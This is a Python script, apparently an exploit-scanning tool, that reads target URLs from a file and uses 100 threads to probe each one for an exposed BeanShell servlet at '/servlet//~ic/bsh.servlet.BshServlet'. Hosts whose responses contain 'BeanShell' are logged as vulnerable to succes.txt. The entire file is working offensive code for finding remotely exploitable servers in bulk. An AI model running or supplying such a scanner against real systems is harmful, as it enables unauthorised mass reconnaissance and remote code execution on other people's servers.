import threadpool
import os.path
import requests

def exp(url):

    poc= r"""/servlet//~ic/bsh.servlet.BshServlet"""
    urls =  url + poc
    # print(url)
    try:

        res = requests.get(urls, timeout=3)
        if "BeanShell" in res.text:
            print("[*]存在漏洞url:{urls}".format(urls=urls))
            with open("succes.txt", 'a') as f:
                f.write(urls +"\n")


    except Exception as e:
        pass


def Thread_pool():
    urls=[]

    with open("target.txt",'r') as f:
        for url in f:
            a=url.strip("\r\n")
            urls.append(a)
            # exp(a)
    pool =threadpool.ThreadPool(100)
    requests =threadpool.makeRequests(exp,urls)
    [pool.putRequest(req) for req in requests]
    pool.wait()



if __name__ == '__main__':
    if os.path.exists("succes.txt"):
        os.remove("succes.txt")
    Thread_pool()
